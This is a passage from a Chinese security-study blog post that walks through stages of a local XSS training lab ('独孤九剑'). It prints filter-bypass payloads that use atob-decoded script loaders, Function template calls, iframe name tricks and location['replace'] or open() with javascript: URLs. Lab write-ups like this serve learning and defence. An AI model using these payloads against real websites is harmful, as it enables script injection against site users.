value">Function</span></span></span>`b$&#123;atob`ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwOi8vMTI3LjAuMC4xL21weS13ZWIveHNzL2FsZXJ0LmpzJz48L3NjcmlwdD4iKQ`&#125;```</pre></td></tr></table></figure><p>外层 Function () 函数是一样的，这里遇到一个新方法 atob () （解码使用 base64 编码的字符串）</p><figure class="highlight js"><figcaption data-lang="JavaScript"></figcaption><table><tr><td data-num="1"></td><td><pre>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;script src='http://127.0.0.1/mpy-web/xss/alert.js'>&lt;/script>"</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="第二动"><a class="anchor" href="#第二动">#</a> 第二动</h3><p>过滤了 <code>= ( ) . &amp; # \ % &lt; &gt; ' &quot; &#123; &#125;</code> 放开了 <code>[ ]</code></p><h4 id="本地iframe调用js-2"><a class="anchor" href="#本地iframe调用js-2">#</a> 本地 iframe 调用 JS</h4><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1/mpy-web/xss/xss-8-2.php/?data=location[`replace`]`javascript:name`<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;script src='http://127.0.0.1'>&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><h4 id="base64编码-4"><a class="anchor" href="#base64编码-4">#</a> base64 编码</h4><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-8-2.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=<span class="token value">atob</span></span></span>`ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwOi8vMTI3LjAuMC4xJz48L3NjcmlwdD4iKQ`;location[`replace`]`javascript:a`;</pre></td></tr></table></figure><h3 id="第三动"><a class="anchor" href="#第三动">#</a> 第三动</h3><p>过滤了 <code>= ( ) . &amp; # \ % &lt; &gt; ' &quot; [ ] Function</code></p><h4 id="openbase64"><a class="anchor" href="#openbase64">#</a> open+base64</h4><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>http://127.0.0.1/mpy-web/xss/xss-8-3.php?data=open`javascript:name//$&#123;atob`ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwOi8vMTI3LjAuMC4xJz48L3NjcmlwdD4iKQ`&#125;`</pre></td></tr></table></figure><h2 id="第九式"><a class="anchor" href="#第九式">#</a> 第九式</h2><p>啥也没有了！！！</p><div class="tags"><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="ic i-tag"></i> 渗透测试</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"><i class="ic i-tag"></i> 靶场</a></div></div><footer><div class="meta"></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="余星酒 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="余星酒 支付宝"><p>支付宝</p></div><div><img data-src="/images/paypal.png" alt="余星酒 贝宝"><p>贝宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>余星酒 <i class="ic i-at"><em>@</em></i>余星酒</li><li class="link"><strong>本文链接：</strong> <a href="http://example.com/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/xss%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/" title="独孤九剑-xss">http://example.com/APT/靶场wp/靶场/xss独孤九剑/独孤九剑/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/HCIA/%E6%8C%87%E4%BB%A4%E5%90%88%E9%9B%86/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciuja1j1j20zk0m8kjl.jpg" title="指令合集"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 网络基础</span><h3>指令合集</h3></a></div><div class="item right"><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/AC/%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciub8ja1j20zk0m81ky.jpg" title="部署方式"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> AC</span><h3>部署方式</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91"><span class="toc-number">1.</span> <span class="toc-text">独孤九剑</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%BC%8F"><span class="toc-number">1.1.</span> <span class="toc-text">第一式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#documentwrite-native%E7%BC%96%E7%A0%81"><span class="toc-number">1.1.1.</span> <span class="toc-text">document.write&#96; &#96;+native 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#svghtml%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="toc-number">1.1.2.</span> <span class="toc-text">svg+html 实体编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">第二式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#documentwritenative%E7%BC%96%E7%A0%81"><span class="toc-number">1.2.1.</span> <span class="toc-text">document [&#39;write&#39;]+native 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#svghtml%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81-2"><span class="toc-number">1.2.2.</span> <span class="toc-text">svg+html 实体编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#settimeunicode%E7%BC%96%E7%A0%81"><span class="toc-number">1.2.3.</span> <span class="toc-text">setTime+unicode 编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%BC%8F"><span class="toc-number">1.3.</span> <span class="toc-text">第三式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#url%E7%BC%96%E7%A0%81"><span class="toc-number">1.3.1.</span> <span class="toc-text">url 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php302%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.3.2.</span> <span class="toc-text">PHP302 重定向</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">第四式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#iframe%E5%86%85%E5%B5%8C"><span class="toc-number">1.4.1.</span> <span class="toc-text">iframe 内嵌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#locationreplace"><span class="toc-number">1.4.2.</span> <span class="toc-text">location[&#39;replace&#39;]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%BC%8F"><span class="toc-number">1.5.</span> <span class="toc-text">第五式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97ip"><span class="toc-number">1.5.1.</span> <span class="toc-text">数字 IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81"><span class="toc-number">1.5.2.</span> <span class="toc-text">base64 编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%BC%8F"><span class="toc-number">1.6.</span> <span class="toc-text">第六式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81-2"><span class="toc-number">1.6.1.</span> <span class="toc-text">base64 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#locationhashslice"><span class="toc-number">1.6.2.</span> <span class="toc-text">location.hash.slice()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E5%BC%8F"><span class="toc-number">1.7.</span> <span class="toc-text">第七式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.7.1.</span> <span class="toc-text">模板字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jsfuck"><span class="toc-number">1.7.2.</span> <span class="toc-text">JSFuck</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E5%BC%8F"><span class="toc-number">1.8.</span> <span class="toc-text">第八式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%8A%A8"><span class="toc-number">1.8.1.</span> <span class="toc-text">第一动</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0iframe%E8%B0%83%E7%94%A8js"><span class="toc-number">1.8.1.1.</span> <span class="toc-text">本地 iframe 调用 JS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81-3"><span class="toc-number">1.8.1.2.</span> <span class="toc-text">base64 编码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%8A%A8"><span class="toc-number">1.8.2.</span> <span class="toc-text">第二动</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0iframe%E8%B0%83%E7%94%A8js-2"><span class="toc-number">1.8.2.1.</span> <span class="toc-text">本地 iframe 调用 JS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81-4"><span class="toc-number">1.8.2.2.</span> <span class="toc-text">base64 编码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%8A%A8"><span class="toc-number">1.8.3.</span> <span class="toc-text">第三动</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#openbase64"><span class="toc-number">1.8.3.1.</span> <span class="toc-text">open+base64</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E5%BC%8F"><span class="toc-number">1.9.</span> <span class="toc-text">第九式</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/APT/web%E6%B8%97%E9%80%8F/AccessSQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="AccessSQL注入">AccessSQL注入</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="MySQL注入">MySQL注入</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/MSSQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="MSSQL注入">MSSQL注入</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/XXE/" rel="bookmark" title="XXE">XXE</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/XSS/" rel="bookmark" title="XSS">XSS</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/SSRF/" rel="bookmark" title="SSRF">SSRF</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="bookmark" title="文件上传">文件上传</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="bookmark" title="文件包含">文件包含</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" rel="bookmark" title="目录遍历">目录遍历</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" rel="bookmark" title="变量覆盖">变量覆盖</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" rel="bookmark" title="未授权访问">未授权访问</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="bookmark" title="命令执行">命令执行</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" rel="bookmark" title="代码执行">代码执行</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="反序列化">反序列化</a></li><li><a href="/APT/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/theHarvester/" rel="bookmark" title="theHarvester">theHarvester</a></li><li><a href="/APT/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/john/" rel="bookmark" title="john">john</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="中间件漏洞">中间件漏洞</a></li><li class="active"><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/xss%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/" rel="bookmark" title="独孤九剑-xss">独孤九剑-xss</a></li><li><a href="/APT/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/BurpSuite/" rel="bookmark" title="BurpSuite">BurpSuite</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/hachthebox/hackthebox%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="bookmark" title="hackthebox基础知识">hackthebox基础知识</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/mysql-sqli-labs/mysql-sqli-labs/" rel="bookmark" title="mysql-sqli-labs">mysql-sqli-labs</a></li><li><a href="/APT/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/MetaSploit/" rel="bookmark" title="MetaSploit">MetaSploit</a></li><li><a href="/APT/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Nmap/" rel="bookmark" title="Nmap">Nmap</a></li><li><a href="/APT/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/SQLMap/" rel="bookmark" title="SQLMap">SQLMap</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulhub/redis/" rel="bookmark" title="Redis">Redis</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulnhub/Chili-1/" rel="bookmark" title="Chili-1">Chili-1</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulnhub/DarkHole%20V2/" rel="bookmark" title="DarkHole V2">DarkHole V2</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulhub/weblogic/" rel="bookmark" title="weblogic">weblogic</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulnhub/Empire%20Lupin%20One-1/" rel="bookmark" title="Empire Lupin One-1">Empire Lupin One-1</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulnhub/Napping/" rel="bookmark" title="Napping">Napping</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulnhub/Doubletrouble-1/" rel="bookmark" title="Doubletrouble-1">Doubletrouble-1</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulnhub/System-Failure/" rel="bookmark" title="System-Failure">System-Failure</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulnhub/Red/" rel="bookmark" title="Vulnhun-Red">Vulnhun-Red</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulnhub/grotesque3/" rel="bookmark" title="grotesque3">grotesque3</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulnhub/grotesque2/" rel="bookmark" title="grotesque2">grotesque2</a></li><li><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/dvwa/dvwa/" rel="bookmark" title="dvwa">dvwa</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="余星酒" data-src="/images/avatar.jpg"><p class="name" itemprop="name">余星酒</p><div class="description" itemprop="description">欢迎参观我的笔记空间 ~ 这里主要会记录一些安全相关的学习笔记 🌸</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">190</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">38</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">30</span> <span class="name">标签</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/HCIA/%E6%8C%87%E4%BB%A4%E5%90%88%E9%9B%86/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/AC/%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/" title="分类于 华为防火墙">华为防火墙</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/%E5%AE%9E%E9%AA%8C/" title="分类于 实验">实验</a></div><span><a href="/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/%E5%AE%9E%E9%AA%8C/%E9%98%B2%E7%81%AB%E5%A2%99NAT%E9%85%8D%E7%BD%AE/" title="防火墙NAT配置">防火墙NAT配置</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/APT/" title="分类于 渗透测试">渗透测试</a> <i class="ic i-angle-right"></i> <a href="/categories/APT/%E9%9D%B6%E5%9C%BA/" title="分类于 靶场">靶场</a></div><span><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulnhub/Empire%20Lupin%20One-1/" title="Empire Lupin One-1">Empire Lupin One-1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/" title="分类于 深信服设备">深信服设备</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/" title="分类于 实验">实验</a></div><span><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/AF/AF%E9%83%A8%E7%BD%B2/" title="AF部署">AF部署</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/APT/" title="分类于 渗透测试">渗透测试</a> <i class="ic i-angle-right"></i> <a href="/categories/APT/%E9%9D%B6%E5%9C%BA/" title="分类于 靶场">靶场</a></div><span><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulnhub/Red/" title="Vulnhun-Red">Vulnhun-Red</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/APT/" title="分类于 渗透测试">渗透测试</a> <i class="ic i-angle-right"></i> <a href="/categories/APT/web%E6%B8%97%E9%80%8F/" title="分类于 web渗透">web渗透</a></div><span><a href="/APT/web%E6%B8%97%E9%80%8F/AccessSQL%E6%B3%A8%E5%85%A5/" title="AccessSQL注入">AccessSQL注入</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/APT/" title="分类于 渗透测试">渗透测试</a> <i class="ic i-angle-right"></i> <a href="/categories/APT/%E5%B7%A5%E5%85%B7/" title="分类于 工具">工具</a></div><span><a href="/APT/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/MetaSploit/" title="MetaSploit">MetaSploit</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" title="分类于 网络基础">网络基础</a></div><span><a href="/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/HCIA/HTTP/" title="HTTP">HTTP</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/" title="分类于 深信服设备">深信服设备</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/" title="分类于 实验">实验</a></div><span><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/VPN/IPSec%20VPN%20%E6%90%AD%E5%BB%BA/" title="IPSec VPN 搭建">IPSec VPN 搭建</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/" title="分类于 深信服设备">深信服设备</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/" title="分类于 实验">实验</a></div><span><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E9%98%B6%E6%AE%B5%E6%B5%8B%E8%AF%95/VPN/" title="VPN">VPN</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Other/" title="分类于 杂项">杂项</a></div><span><a href="/Other/%E5%A4%87%E5%BF%98%E5%BD%95/" title="备忘录">备忘录</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">余星酒 @ 余星酒</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"APT/靶场wp/靶场/xss独孤九剑/独孤九剑/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->